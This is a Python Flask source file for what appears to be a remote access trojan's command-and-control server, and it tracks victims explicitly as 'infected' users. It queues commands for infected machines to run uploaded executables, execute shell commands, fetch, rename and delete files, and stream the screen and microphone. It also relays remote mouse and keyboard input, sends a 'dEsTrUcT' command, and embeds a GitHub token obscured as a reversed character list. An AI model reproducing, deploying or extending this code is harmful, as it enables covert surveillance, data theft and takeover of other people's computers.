import os
from time import time
from flask import Flask, render_template, request, redirect, jsonify, Response, after_this_request, send_file
from datetime import datetime
import base64
import json
import requests as rq
import io
from zoneinfo import ZoneInfo

app = Flask(__name__)
firstReload = True
timezone = ZoneInfo("Asia/Kolkata")
startTime = time()
spam = False
send = False
comTxt = "none"
file_content = None
folder_content = None
selected_user = "103W"
output = ""
control_data = {}
t = ['U', 'N', 'i', '4', 'I', '3', 'P', 'L', 'L', 'A', 'C', 'P', 'F', 'v', 'b', '0', 'V', 'A', '6', 'r', 'S', '0', 'b', 'i', '0', '4', 'z', '9', 'K', 'e', 'V', 'U', '0', '1', '2', 'm', '_', 'p', 'h', 'g']
token = ""
for i in reversed(t):
	token += i
owner = "ms32-org"
repo = "maksadPura"
branch = "main" 
commit_message = "file upload"
STATIC_FOLDER = os.path.join("static")
if not os.path.exists(STATIC_FOLDER):
    os.makedirs(STATIC_FOLDER)
state_file = os.path.join(STATIC_FOLDER, "state.json")
UPLOAD_FOLDER = os.path.join(STATIC_FOLDER, "sounds")
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

user_status = None


def userInfo():
    global user_status    
    with open(os.path.join(STATIC_FOLDER,"users.json")) as file:
        data = json.load(file)
    users = data["users"]
    user_status = {}
    for user in users:
        user_status[user]= time()

    with open(state_file,"w") as file:
        states = {}
        for user in users:
            states[str(user)] = {
                "hideToggleState": {
                    "state": "off",
                    "color": "red"
                },
                "spamToggleState": {
                    "state": "off",
                    "color": "red"
                },
                "flipToggleState": {
                    "state": "off",
                    "color": "red"
                },
                "shareToggleState": {
                    "state": "off",
                    "color": "red"
                },
                "INToggleState": {
                    "state": "off",
                    "color": "red"
                },
                "micToggleState": {
                    "state": "off",
                    "color": "red"
                },
                "comsToggleState": {
                    "state":"off",
                    "color": "red"
                }                       
            }
        json.dump(states, file, indent=4)			
userInfo()
@app.route("/")
def root():
    global firstReload
    state_file = os.path.join(STATIC_FOLDER, "state.json")
    files = os.listdir(UPLOAD_FOLDER)
    images = os.listdir(os.path.join(STATIC_FOLDER,"images"))
    videos = os.listdir(os.path.join(STATIC_FOLDER,"videos"))
    tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
    apps = os.listdir(os.path.join(STATIC_FOLDER,"apps"))
    state = None
    color = "red"
    data1= None
    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
        target = json.load(file)
    users = target["users"]
    selected = target["selected"]
    
    with open(state_file, "r") as file:
        data1 = json.load(file)
    hs = data1[selected_user]["hideToggleState"]["state"]
    hc = data1[selected_user]["hideToggleState"]["color"]
    ss = data1[selected_user]["spamToggleState"]["state"]
    sc = data1[selected_user]["spamToggleState"]["color"]
    fs = data1[selected_user]["flipToggleState"]["state"]
    fc = data1[selected_user]["flipToggleState"]["color"]
    shs = data1[selected_user]["shareToggleState"]["state"]
    shc = data1[selected_user]["shareToggleState"]["color"]
    is1 = data1[selected_user]["INToggleState"]["state"]
    ic = data1[selected_user]["INToggleState"]["color"]
    ms = data1[selected_user]["micToggleState"]["state"]
    mc = data1[selected_user]["micToggleState"]["color"]
    cs = data1[selected_user]["comsToggleState"]["state"]
    cc = data1[selected_user]["comsToggleState"]["color"]
    if not firstReload:
        if time() - user_status[selected] <= 2.5:
            state = "Online"
            color = "green"
        elif time() - user_status[selected] > 2.5:
            state = "Offline"
            color = "red"
    if os.path.exists(tasks_file):
        with open(tasks_file, "r") as file:
            data = json.load(file)
    else:
        data = {"tasks": []}
    firstReload = False       
    return render_template("index.html", state=state if state else "Offline",files=files,images=images,videos=videos, exes=apps,tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,ic=ic,is1=is1,mc=mc,ms=ms,cc=cc,cs=cs,users=users,selected = selected_user)

@app.route("/edit", methods=["POST", "GET"])
def edit():
    global spam
    if request.method == "POST":
        message = request.form["text"]  
        with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
            if ("pLaY" not in message and "oPeN" not in message):    
                file.write("sPeAk" + message)
            else:
                file.write(message)
        return redirect("/")
    return "message updated"

@app.route("/command", methods=["GET", "POST"])
def command():
    global startTime
    global selected_user
    global spam
    global comTxt
    message_file = os.path.join(STATIC_FOLDER, "message.txt")
    tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
    
    with open(tasks_file, "r") as file:
        tasks = json.load(file)

    if request.method == "POST":
        user = request.get_json().get("user")

        user_status[user] = time()
        if selected_user == user:
            cmd = ""
            if os.path.exists(message_file):
                with open(message_file, "r") as file:
                    cmd = file.read()
            if cmd == "":
                if os.path.exists(tasks_file):
                    tasks_to_delete = None
                    for task in tasks["tasks"]:
                        if task["user"] == user:
                            exe = datetime.strptime(task["execution_time"], "%d-%m-%Y %H:%M")
                            exe = exe.strftime("%d-%m-%Y %H:%M")
                            now = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")
                            if exe <= now:
                                if "wRiTe " in task["cmd"]:
                                    comTxt = task["cmd"].replace("wRiTe ", "")
                                else:
                                    cmd = task["cmd"]
                                tasks_to_delete = task["id"]
                                break
    
                    if tasks_to_delete is not None:
                         tasks["tasks"] = [task for task in tasks["tasks"] if task["id"] != tasks_to_delete]
                         with open(tasks_file, "w") as file:
                            json.dump(tasks, file, indent=4)

            if not spam:
                with open(message_file, "w") as file:
                    file.write("")

            return cmd if cmd else "none"

        else:
            tasks_to_delete = None
            taskcmd = None
            for task in tasks["tasks"]:
                if task["user"] == user:
                    exe = datetime.strptime(task["execution_time"], "%d-%m-%Y %H:%M")
                    exe = exe.strftime("%d-%m-%Y %H:%M")
                    now = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")
                    if exe <= now:
                        taskcmd = task["cmd"]
                        tasks_to_delete = task["id"]
                        break

            if tasks_to_delete is not None:
                tasks["tasks"] = [task for task in tasks["tasks"] if task["id"] != tasks_to_delete]
                with open(tasks_file, "w") as file:
                    json.dump(tasks, file, indent=4)

            return taskcmd if taskcmd else "none"

    return "none"


@app.route("/play", methods=["POST", "GET"])
def play():
    if request.method == "POST":
        file = request.form["audio"] 
        if file != "":
            try:
                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                    a.write("pLaY " + file)
            except:
                pass
    return redirect("/")

@app.route("/delete", methods=["POST", "GET"])
def delete():
    if request.method == "POST":
        file = request.form["text"]
        if file != "":
            try:
                os.remove(os.path.join(UPLOAD_FOLDER, file))
            except:
                pass
    return redirect("/")

@app.route("/update", methods=["POST", "GET"])
def update():
    if request.method == "POST":
        file = request.files["file"]
        if file and file.filename != "":
            if file.filename.endswith(".exe"):
                file.save(os.path.join(STATIC_FOLDER,"updates","ms32-1.exe" ))
                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                    a.write("uPdAtE " + file.filename)
    return redirect("/")

@app.route("/url", methods=["POST", "GET"])
def url():
    if request.method == "POST":
        url = request.form["url"] or request.get_data()
        with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
            file.write("oPeN " + url)
    return redirect("/")

@app.route("/status", methods=["POST", "GET"])
def status():
    if request.method == "GET":
        user_state = {}
        for user in user_status:
            user_state[user] = True if time() - user_status[user] <= 3 else False
        
    return jsonify(user_state)

@app.route("/add-task", methods=["POST", "GET"])
def schedule():
    if request.method == "POST":
        data = {"tasks": []}
        cmd = request.form["task"]
        try:
            execution_time = datetime.strptime(request.form["task-datetime"], "%Y-%m-%dT%H:%M")
        except ValueError as e:
            return f"Invalid datetime format: {e}", 400

        tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
        try:
            if os.path.exists(tasks_file):
                with open(tasks_file, "r") as file:
                    data = json.load(file)
        except Exception as e:
            return f"Error reading tasks.json: {e}", 500

        task = {
            "id": len(data["tasks"]),
            "cmd": cmd,
            "execution_time": execution_time.strftime("%d-%m-%Y %H:%M"),
            "user":request.form["user"]
        }
        data["tasks"].append(task)

        try:
            with open(tasks_file, "w") as file:
                json.dump(data, file, indent=4)
        except Exception as e:
            return f"Error writing to tasks.json: {e}", 500

        return redirect("/")

@app.route("/delete-task", methods=["POST", "GET"])
def delete_task():
    if request.method == "POST":
        id = request.form["task-id"]
        new_task = {"tasks": []}
        tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
        if os.path.exists(tasks_file):
            with open(tasks_file, "r") as file:
                tasks = json.load(file)
            for task in tasks["tasks"]:
                if str(task["id"]) != id:
                    new_task["tasks"].append(task)
            with open(tasks_file, "w") as file:
                json.dump(new_task, file, indent=4)
    return redirect("/")

@app.route("/toggle",methods=["POST"])
def toggle():
    global spam
    global comTxt
    if request.method == "POST":
        data = request.get_json()
        cmd = data.get("cmd")
        state = data.get("state")
        color = "green" if state == "on" else "red"
        
        state_file = os.path.join(STATIC_FOLDER, "state.json")
        
        if os.path.exists(state_file):
            with open(state_file, "r") as file:
                data = json.load(file)
        
            if cmd == "hIdE":
                data[selected_user]["hideToggleState"]["state"] = state
                data[selected_user]["hideToggleState"]["color"] = color
            elif cmd == "sPaM":
                data[selected_user]["spamToggleState"]["state"] = state
                data[selected_user]["spamToggleState"]["color"] = color
            elif cmd == "fLiP":
                data[selected_user]["flipToggleState"]["state"] = state
                data[selected_user]["flipToggleState"]["color"] = color
            elif cmd == "sHaRe":
                data[selected_user]["shareToggleState"]["state"] = state
                data[selected_user]["shareToggleState"]["color"] = color
            elif cmd == "bLoCk":
                data[selected_user]["INToggleState"]["state"] = state
                data[selected_user]["INToggleState"]["color"] = color
            elif cmd == "mIc":
                data[selected_user]["micToggleState"]["state"] = state
                data[selected_user]["micToggleState"]["color"] = color
            elif cmd == "cOmS":
                data[selected_user]["comsToggleState"]["state"] = state
                data[selected_user]["comsToggleState"]["color"] = color        
            with open(state_file, "w") as file:
                json.dump(data, file, indent=4)
                           
        if cmd == "sPaM":
            spam = True if state == "on" else False
        elif cmd == "cOmS":
            if state.lower() == "on":
                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                    file.write(f"rUn speakdisplay.exe")
            elif state.lower() == "off":
                comTxt = "dEsTrUcT"
                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                    file.write("")
        elif cmd != "cOm":
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                file.write(f"{cmd} {state}")          
    return redirect("/")

@app.route("/change-user", methods=["POST"])
def change_user():
    global selected_user
    data = request.get_json()
    user = data.get("user")
    selected_user = str(user)
    print(selected_user)
    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
        target = json.load(file)
    target["selected"] = selected_user
    with open(os.path.join(STATIC_FOLDER, "users.json"), "w") as file:
        json.dump(target, file, indent=4)
    return "done"

@app.route("/exe",methods=["POST"])
def exe():
    if request.method == "POST":
        file = request.files["file"]
        if file and file.filename != "":
            file.save(os.path.join(STATIC_FOLDER, "apps", file.filename))
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                a.write("rUn " + file.filename)
    return redirect("/")            

@app.route("/run-exe",methods=["POST"])
def run_exe():
    if request.method == "POST":
        file = request.form["exe"]
        if file:           
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                a.write("rUn " + file)
    return redirect("/")        

@app.route("/image", methods=["GET", "POST"])
def img():
    if request.method == "POST":
        file = request.files["file"]
        if file and file.filename != "":
            file.save(os.path.join(STATIC_FOLDER, "images", file.filename))
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                a.write("iMaGe " + file.filename)
    return redirect("/")

@app.route("/img",methods=["GET", "POST"])
def display():
	if request.method == "POST":
		file = request.form["img"]
		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
			a.write("iMaGe " + file)
	return redirect("/")
	
@app.route("/vid",methods=["GET", "POST"])
def video():
	if request.method == "POST":
		file = request.form["vid"] 
		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
			a.write("vIdEo " + file)	
	return redirect("/")
	
@app.route("/logs",methods=["GET","POST"])
def logs():
    global prevlog
    data = None
    with open(os.path.join(STATIC_FOLDER,"logs.json"), "r") as file:
        data = json.load(file)
    prevlog = len(data["logs"])
    return render_template("logs.html",logs=data)
              

@app.route("/output", methods=["POST", "GET"])
def output1():
    data = request.get_json()
    err = data["err"]
    user = data["user"]
    logfile = os.path.join(STATIC_FOLDER, "logs.json")
    
    try:
        if os.path.exists(logfile):
            with open(logfile, "r") as file:
                data = json.load(file)
    except Exception as e:
        return f"Error reading log.json: {e}", 500

    log = {
        "no": len(data["logs"]) + 1, 
        "output": err,
        "time": datetime.now(timezone).strftime("%d-%m-%Y %H:%M"),
        "user": user
    }
    
    data["logs"].append(log)

    try:
        with open(logfile, "w") as file:
            json.dump(data, file, indent=4)
    except Exception as e:
        return f"Error writing to log.json: {e}", 500    
    
    return log

@app.route("/update-log",methods=["GET","POST"])
def update_log():
    with open(os.path.join(STATIC_FOLDER,"logs.json"), "r") as file:
        data = json.load(file)
    return jsonify(data)
@app.route("/clear-logs",methods=["POST","GET"])	
def clear_logs():
	logfile = os.path.join(STATIC_FOLDER, "logs.json")
	data = {
		"logs":[]
	}
	with open(logfile, "w") as file:
		json.dump(data, file, indent=4)	
	return "done"           
@app.route("/err",methods=["GET","POST"])
def err():
    if request.method == "POST":
        no = request.get_data().decode("utf-8")
        with open(os.path.join(STATIC_FOLDER,"message.txt")) as file:
            file.write(f"eRr {no}")
    return "done"
@app.route("/clear",methods=["POST","GET"])
def clear():
    with open(os.path.join(STATIC_FOLDER,"ip.txt"),"w") as file:
        file.write("")
    return "clear"

@app.route("/screen",methods=["GET","POST"])
def screen():
	return render_template("screen.html")    
@app.route("/control", methods=["GET", "POST"])
def control():
    global control_data
    if request.method == "POST":
        data = request.get_json()
        if data["type"] == "key":
            control_data["type"] = "key"
            control_data["btn"] = data["button"]
        elif data["type"] == "click":
            control_data["type"] = "mouse"
            control_data["x"] = data["x"]
            control_data["y"] = data["y"]
            control_data["mouse"] = data["button"]
            control_data["width"] = data["width"]
            control_data["height"] = data["height"]
        elif data["type"] == "scroll":
            control_data["type"] = "scroll"
            control_data["deltaY"] = data["deltaY"]
        elif data["type"] == "dbclick":
            control_data["type"] = "dbclick"
            control_data["x"] = data["x"]
            control_data["y"] = data["y"]
            control_data["width"] = data["width"]
            control_data["height"] = data["height"]
        elif data["type"] == "drag":
            control_data["type"] = " drag"
            control_data["x1"] = data["x1"]
            control_data["x2"] = data["x2"]
            control_data["y1"] = data["y1"]
            control_data["y2"] = data["y2"]
            control_data["width"] = data["width"]
            control_data["height"] = data["height"]
        	           
        return "done"

    if request.method == "GET":
        data1 = control_data
        control_data = {}      
        return jsonify(data1)
        
@app.route("/terminal",methods=["GET", "POST"])
def terminal():
    global output
    if request.method == "GET":
        audios = os.listdir(os.path.join(STATIC_FOLDER,"sounds"))
        images = os.listdir(os.path.join(STATIC_FOLDER,"images"))
        videos = os.listdir(os.path.join(STATIC_FOLDER,"videos"))
        return render_template("terminal.html",user=selected_user,audios=audios,videos=videos,images=images)
    elif request.method == "POST":
        cmd = request.get_json()
        print(cmd)	
        if "input" in cmd:		
            if cmd["input"]:
                output = None
                with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
                    cmd1 = cmd["input"]
                    file.write(f"cMd {cmd1}")

        elif "output" in cmd:
            if cmd["output"]:
                output = cmd["output"]    
            
    return "done"
    
@app.route("/get-output",methods=["GET","POST"])
def get_output():
    global output	
    if request.method == "GET":
        if output:	
            shaktimaan = output
            output = None	
            with open(os.path.join(STATIC_FOLDER,"debug.txt"),"w") as file:
                file.write(f"output {shaktimaan}")
            print(shaktimaan)
            return shaktimaan
        else:
            return "try again",202	              
            
@app.route("/cmd",methods=["POST","GET"])
def cmd():
	if request.method == "POST":
		commands = {
			"speak":"sPeAk",
			"open":"oPeN",
			"play":"pLaY",
			"img":"iMaGe",
			"vid":"vIdEo",
			"err":"eRr",
			"cmd":"cMd"
		}
		msg = (request.get_data().decode("utf-8")).split(" ")
		com = commands[msg[0]]
		msg.pop(0)
		msg1 = " ".join(msg)
		command = f"{com} {msg1}"
		with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
			file.write(command)
	return "done"
	
@app.route("/audio",methods=["GET","POST"])
def audio():
	global send
	if request.method == "POST":
		with open(os.path.join(STATIC_FOLDER,"mic","audio.wav"),"wb") as file:
			file.write(request.data)
			send = True
	return "done"
	
@app.route("/get-audio",methods=["GET","POST"])
def stream_audio():
    global send
    def generate():
        global send
        with open(os.path.join(STATIC_FOLDER,"mic",'audio.wav'), 'rb') as audio_file:
            while chunk := audio_file.read(1024):
                yield chunk
        send = False
    if send:
        return Response(generate(), mimetype="audio/wav")
    else:
    	return "none",204  	 
		
@app.route("/upload-files",methods=["POST", "GET"])
def upload_files():
	if request.method == "POST":
		file = request.files["file"]
		path = request.form["path"]
		if file and file.filename !="":
			encoded_content = base64.b64encode(file.read()).decode("utf-8")
			with open(os.path.join(STATIC_FOLDER,path,file.filename),"wb") as a:
				a.write(file.read())
			url = f"https://api.github.com/repos/{owner}/{repo}/contents/{STATIC_FOLDER}/{path}/{file.filename}"
			# file.save(os.path.join(STATIC_FOLDER,path,file.filename))
			headers = {
				    "Authorization": f"token {token}",
				    "Accept": "application/vnd.github.v3+json"
				}				
			data = {
				    "message": commit_message,
				    "content": encoded_content,
				    "branch": branch
				}				
			response = rq.put(url, json=data, headers=headers)				
			if response.status_code == 201:
				print("File successfully added to the repository!")
	return redirect("/")

@app.route("/get-com",methods=["GET","POST"])
def get_com():
    global comTxt
    if request.method == "GET":
        c = comTxt
        comTxt = "none"
        return c
    elif request.method == "POST":
        comTxt = request.get_data().decode("utf-8")
    return "done"
    
@app.route("/com-txt",methods=["GET","POST"])
def com_txt():
    global comTxt
    # with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
    #     file.write()
    comTxt = request.form["coms"]
    return redirect("/")
@app.route("/com",methods=["GET","POST"])
def com():
    with open(state_file, "r") as file:
        data1 = json.load(file)
    color = data1[selected_user]["comToggleState"]["color"]
    return render_template("com.html",color=color)   
    
@app.route("/edit-file", methods=["POST", "GET"])
def edit_file():
    if request.method == "POST":
        data = request.form["textarea_content"]
        path = request.form["text_input"]
        
        print(f"Path: {path}")
        try:
            path = os.path.abspath(path)
            if path.endswith(".json"):
                json_data = json.loads(data)
                
                with open(path, "w") as json_file:
                    json.dump(json_data, json_file, indent=4)  
            else:
                with open(path, "w") as file:
                    file.write(data)
            
            print("File successfully edited!")
        except Exception as e:
            print(f"Error: {e}")
        
        return redirect("/")
    else:
        return render_template("edit.html")

@app.route("/req-folder",methods=["GET","POST"]) 
def fetchFolder():
	if request.method == "POST":
		path = request.get_json()
		path = path["path"]
		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
			file.write(f"gEtFoLdEr {path}")
	return "done"
	
@app.route("/post-folder",methods=["GET","POST"])
def post_folder():
	global folder_content
	if request.method == "POST":
		folder_content = request.get_json()
	return "done"
	
@app.route("/get-folder", methods=["GET", "POST"])
def get_folder():
    global folder_content
    if folder_content is not None:
        f = folder_content
        folder_content = None
        return jsonify(f)
    else:
        return "data nahi aaya abhi baad me aao", 400

						
@app.route("/req-file",methods=["POST","GET"])
def req_file():
	path = request.get_data().decode("utf-8")
	with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
		file.write(f"gEtFiLe {path}")
	return "done"
	
@app.route("/post-file",methods=["GET","POST"])
def post_file():
	global file_content
	if request.method == "POST":
		file = request.files["file"]
		file_content = file.read()
	return "done"
	
@app.route("/get-file",methods=["GET","POST"])
def get_file():
	global file_content
	if request.method == "GET":
		if file_content:
			file_io = io.BytesIO(file_content)
			file_content = None
			return send_file(file_io, mimetype='application/octet-stream', as_attachment=True, download_name="downloaded_file")
		elif file_content is None:
			return 'No file available for download', 400 
	return "done"

@app.route("/rename-file",methods=["GET","POST"])
def rename_file():
	if request.method == "POST":
		data = request.get_json()
		path = data.get("path")
		new_name = data.get("name")
		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
			file.write(f"rEnAmE {path}|{new_name}")
	return "done"
	
@app.route("/delete-file",methods=["POST","GET"])
def delete_file():
	if request.method == "POST":
		data = request.get_json()
		path = data["path"]
		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
			file.write(f"dElEtE {path}")
	return "done"
			
@app.route("/filesystem/<user>",methods=["GET","POST"])
def filesystem(user):
	return render_template("filesystem.html")
	
offer = None
answer = None
candidates = []

@app.route("/send-offer", methods=["POST"])
def send_offer():
    global offer
    data = request.json
    offer = data
    print(f"[Flask] Offer received: {offer}")
    return "done"

@app.route("/get-offer", methods=["GET"])
def get_offer():
    global offer
    if offer is not None:
        off = offer
        offer = None  # Reset after sending it
        return jsonify(off)
    else:
        return "No offer", 408

@app.route("/send-answer", methods=["POST"])
def send_answer():
    global answer
    data = request.json
    answer = data
    print(f"[Flask] Answer received: {answer}")
    return "done"

@app.route("/get-answer", methods=["GET"])
def get_answer():
    global answer
    if answer is not None:
        ans = answer
        answer = None  # Reset after sending it
        return jsonify(ans)
    else:
        return "No answer", 408

@app.route("/send-candidate", methods=["POST"])
def send_candidates():
    global candidates
    data = request.json
    candidates.append(data)
    print(f"[Flask] Candidate received: {data}")
    return "done"

@app.route("/get-candidates", methods=["GET"])
def get_candidates():
    global candidates
    if candidates:
        candidate = candidates
        candidates = []  # Clear the list after sending
        return jsonify(candidate)
    else:
        return "No candidates", 408

@app.route("/diy",methods=["GET"])
def diy():
    return render_template("DIY.html")

@app.route("/screenshare",methods=["GET"])
def screenshare():
     return render_template("screenshare.html")
@app.route("/audiomic",methods=["GET"])
def audiomic():
     return render_template("audio.html")

@app.route("/get-user",methods=["GET"])
def get_user():
    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
        target = json.load(file)
    inf_users = target["infected"]
    user = f"inf{len(inf_users)+1}"
    target["infected"].append(user)
    target["users"].append(user)
    with open(os.path.join(STATIC_FOLDER, "users.json"), "w") as file:
        json.dump(target, file, indent=4)
    url = f"https://api.github.com/repos/{owner}/{repo}/contents/{STATIC_FOLDER}/users.json"
    headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }				
    data = {
            "message": "inf user added",
            "content": base64.b64encode(json.dumps(target).encode()).decode(),
            "branch": branch
        }				
    response = rq.put(url, json=data, headers=headers)		
    userInfo()		
    if response.status_code == 201:
        print("user successfully added")

    return user    
if __name__ == "__main__":
    app.run(host="0.0.0.0")
